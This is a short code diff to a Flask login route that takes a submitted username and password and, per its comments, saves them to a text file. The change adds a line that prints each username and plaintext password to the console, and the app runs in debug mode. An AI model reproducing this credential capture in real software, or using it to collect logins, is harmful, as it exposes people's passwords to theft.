@@ -9,6 +9,7 @@ def hello_world():
         username = request.form.get('username')
         password = request.form.get('password')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        print(f"login attempt - Username: {username}\nPassword: {password}")
         
         # Save credentials to create.txt
         with open('create.txt', 'a') as f:
@@ -20,4 +21,5 @@ def hello_world():
     return render_template("index.html")
 
 if __name__ == "__main__":
+
     app.run(debug=True, port=1111)
